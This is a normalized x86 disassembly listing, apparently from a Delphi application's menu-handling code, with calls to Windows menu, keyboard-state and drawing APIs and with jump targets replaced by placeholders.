mov eax edx
xchg ecx eax
mov edx ebx
call sub_45f260
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_462c24
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_462bf4
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_463f48
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_462c94
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_462bf4
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_462cb0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_462bf4
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_462360
mov ebx eax
xor edx edx
mov eax edi
call sub_46285c
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_461cc8
mov eax [ esi + 0x34 ]
call sub_461cc8
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_45fc04
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_456054
push eax
call DrawMenuBar
sub_462d9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_462d9c
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push j_sub_403778#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_462bf4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_461cc8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_462d8c
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_462ef0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42a318
xor eax eax
push ebp
push sub_462fee
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42a318
xor eax eax
push ebp
push sub_462fc3
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_462d9c
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42a310
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462ff5
mov eax [ rw-data ]
call sub_42a310
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_462bf4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_463014
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_463398
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_463398
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_4630d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_46366c
mov eax ebx
call sub_408920
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_463170
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_4630d0
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_40431c
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_40456c
lea edx [ ebp - 0x200 ]
call sub_4089e4
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_463204
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_463274
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_463714
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_463714
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_463714
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_463280
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_463170
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_463204
mov eax ebx
call sub_463738
jmp r-xdata
sub_4632e8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_463330
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_45d560
mov eax ebx
call sub_462b44
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_45d5a4
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_421440
sub_46336c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_42168c
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_463330
sub_4633b0
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_462bf4
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_462bf4
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_4666f8
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_46340c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_4634e1
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_462bf4
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_462bf4
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_4617a0
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4617b0
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404294
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404294
mov eax [ ebp - 0xc ]
pop edx
call sub_4080b0
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_464258
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4634e8
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4040d0
retn
sub_4634f4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_4633b0
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_46340c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_46366c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_462d78
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_462bf4
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_462bf4
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_4089c4
mov eax [ ebp + 0x10 ]
call sub_408908
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_463738
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_44c734
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_463714
mov [ ebx + 0x41 ] 0x1
sub_463760
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403460
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_463714
mov [ ebx + 0x41 ] 0x1
sub_4637ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4632e8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_463170
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_46387c
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_4638b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4638e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463904
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_463e37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463e3e
lea eax [ ebp - 0x30 ]
call sub_4040ac
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4189b0
mov edx [ esi + 0x4 ]
call sub_462cb0
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46fd08
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4189b0
mov dx [ esi + 0x4 ]
call sub_462c94
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424d10
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_463c6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_463c4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_4256c8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_425568
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4640dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463c54
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_4256c8
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_4634f4
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_462bf4
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4189b0
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_462bf4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_463dad
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424d10
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_463d88
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_463d6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_4256c8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_425568
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463d72
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_4256c8
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_44c9b8
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46fd08
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4189b0
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_462bf4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4189b0
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_462bf4
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4189b0
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4189b0
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_462bf4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4189b0
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4189b0
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_462c24
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4189b0
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4189b0
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_462c24
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
